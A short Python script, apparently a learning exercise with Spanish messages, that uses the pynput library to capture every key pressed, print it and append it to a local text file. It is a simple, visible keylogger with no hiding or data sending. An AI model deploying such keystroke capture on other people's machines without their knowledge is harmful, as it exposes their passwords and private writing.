from pynput import keyboard as kb

def funtion_write(roto):
    try:
        file = open("fichero.txt", "a")
        file.write(f"\n{roto}")
        file.close()
    except OSError as error:
        print(error)

def pulsa(tecla):
    funtion_write(f"Se ha pulsado {tecla}")
    print('Se ha pulsado la tecla ' + str(tecla))

with kb.Listener(pulsa) as escuchador:
    escuchador.join()